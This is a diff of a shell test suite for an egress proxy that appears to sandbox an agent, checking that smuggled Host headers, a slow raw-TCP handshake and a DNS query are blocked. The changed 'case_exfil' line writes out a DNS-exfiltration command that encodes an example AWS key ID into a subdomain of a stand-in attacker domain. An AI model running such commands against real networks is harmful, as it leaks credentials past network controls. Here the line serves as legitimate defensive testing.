@@ -59,7 +59,7 @@ case_propfind() { expect_blocked 'PROPFIND / HTTP/1.1\r\nHost: denied.example\r\
 case_absolute() { expect_blocked 'GET http://allowed.example/ HTTP/1.1\r\nHost: denied.example\r\nConnection: close\r\n\r\n' 'rule host-mismatch'; }
 case_two_hosts() { expect_blocked 'GET / HTTP/1.1\r\nHost: allowed.example\r\nHost: denied.example\r\nConnection: close\r\n\r\n' 'HTTP/1.1 40[03]'; }
 case_slow_tls() { local out; out="$(agent sh -c "(printf '\026'; sleep 2; printf '\003\001\000\005hello') | nc -w 4 198.18.99.20 80" 2>/dev/null)"; echo "received: ${#out} bytes"; [ -z "$out" ]; }
-case_exfil()    { agent sh -c "dig +tries=1 +time=4 akiaiosfodnn7example.exfil.attacker.test A" | grep -E 'status: REFUSED'; }
+case_exfil()    { agent sh -c "dig +tries=1 +time=4 @10.99.0.2 akiaiosfodnn7example.exfil.attacker.test A" | grep -E 'status: REFUSED'; }
 case_metrics()  { agent curl -s -m 5 http://10.99.0.2:9090/metrics; }
 case_ca()       { agent curl -s -m 5 http://10.99.0.2:3128/ca.crt | grep -m1 'BEGIN CERTIFICATE'; }
 check "agent: request line with a leading empty line, denied Host -> 403 (never raw L4)" ok case_crlf
